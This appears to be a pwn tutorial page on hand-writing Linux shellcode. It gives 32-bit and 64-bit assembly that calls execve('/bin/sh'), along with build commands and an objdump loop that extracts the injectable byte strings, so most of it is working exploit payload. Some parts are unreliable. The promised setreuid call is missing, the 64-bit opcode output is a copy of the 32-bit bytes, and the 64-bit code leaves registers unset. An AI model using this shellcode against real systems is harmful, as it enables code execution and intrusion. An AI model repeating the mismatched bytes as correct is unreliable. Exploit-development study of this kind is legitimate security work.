# Construct your own ShellCode

A shellcode is a small piece of code written in low-level programming languages, typically assembly language, that is designed to be injected into a system to perform specific actions.

Exploit: [Shell code injection](/pwn/shell-code-injection.md)

### Table of Content

- [32 bit](#32-bit)
- [64 bit](#64-bit)
    - [AntiDump + Obfuscation](#anti-dump--obfuscation)

[ASM cheat sheet](https://github.com/Gottiee/asm)

## 32 bit

### asm

To write your own shell code, you need to know how code in assembly. 

[Asm Cheat Sheet](https://github.com/Gottiee/asm)

Example of shell code calling setreuid and execve(/bin/bash)

```asm
global _start

_start:

    xor eax, eax
    push eax
    push 0x68732f2f ; //sh
    push 0x6e69622f ; /bin
    mov ebx, esp
    push eax
    push ebx
    mov ecx, esp
    mov al, 0xb
    int 0x80
```

Compile it:

```bash
$> nasm -f elf32 main.asm -o asm.o
$> ld -m elf_i386 asm.o -o asm
```

Generat opcode:

```bash
$> for i in $(objdump -D asm |grep "^ " |cut -f2); do echo -n '\\x'$i; done;echo
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
```

## 64 bit

```asm
global _start
   
_start:
	mov rcx, 0x68732f6e69622f   ; /bin/sh
	push rcx                    ; push the immediate value stored in rcx onto the stack
	xor rdx, rdx
	lea rdi, [rsp]              ; load the address of the string that is on the stack into rdi
	mov al, 0x3b
	syscall                     ; make the syscall
```

Compile it:

```bash
nasm -f elf64 main.asm -o asm.o
ld asm.o -o asm
```

Generat opcode:

```bash
$> for i in $(objdump -D asm |grep "^ " |cut -f2); do echo -n '\\x'$i; done;echo
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
```

### Anti dump + Obfuscation

- [docu](https://pentester.blog/?cat=2)

---

[**:arrow_right_hook: Back Pwn**](/pwn/pwn.md)